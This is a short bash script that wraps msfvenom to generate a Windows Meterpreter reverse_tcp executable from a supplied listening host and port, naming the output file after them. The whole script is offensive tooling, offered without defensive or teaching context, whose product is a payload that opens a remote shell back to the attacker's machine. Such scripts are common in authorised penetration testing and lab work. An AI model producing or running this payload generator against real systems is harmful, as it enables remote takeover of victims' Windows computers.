lhost=$1
lport=$2
if [ $# -eq 2 ] 
then
 # replace dots in the IP (escape the dot)
 ip_str=$(echo "$lhost"  | sed 's/\./_/g')
 cmd="msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > win-met-rev-tcp-$ip_str-$lport.exe"
 eval $cmd
 echo "Command executed: $cmd"
else
 echo "Usage $0 <lhost> <port>"
fi
